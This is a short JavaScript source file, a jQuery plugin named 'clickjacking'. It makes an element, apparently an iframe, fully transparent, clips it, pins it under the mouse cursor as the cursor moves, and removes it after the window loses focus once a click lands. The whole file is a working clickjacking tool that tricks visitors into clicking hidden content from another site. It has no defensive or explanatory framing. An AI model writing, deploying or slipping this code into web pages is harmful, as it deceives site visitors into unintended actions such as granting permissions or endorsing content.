(function ( $ ) {
    $.fn.clickjacking = function( options ) {

        this.cropIframe = function(rect){
            var rect = 'rect(' + settings.rect.top + 'px, ' + settings.rect.right + 'px, '
                + settings.rect.bottom + 'px, ' + settings.rect.left + 'px)';

            $(this).css('clip', rect);
        };

        this.applyCss = function(settings){
            $(this).css('position', 'absolute').css('top', 0).css('left', 0).css('opacity', settings.opacity)
                .attr('width', settings.width + 'px').attr('height', settings.height + 'px');
        };

        var settings = $.extend({
            opacity: 0,
            width: 500,
            height: 100,
            rect: {
                top: 0,
                right: 0,
                bottom: 0,
                left: 0
            }
        }, options );

        var self = $(this);

        this.applyCss(settings);
        this.cropIframe(settings.rect);


        $(document).mousemove(function(e){
            self.css('top', e.clientY - 270 + 'px')
                .css('left', e.clientX - 1110 + 'px');
        });

        $(window).blur(function(){
            setTimeout(function(){
                self.remove();
            }, 500);
        });

        return this;
    };
}( jQuery ));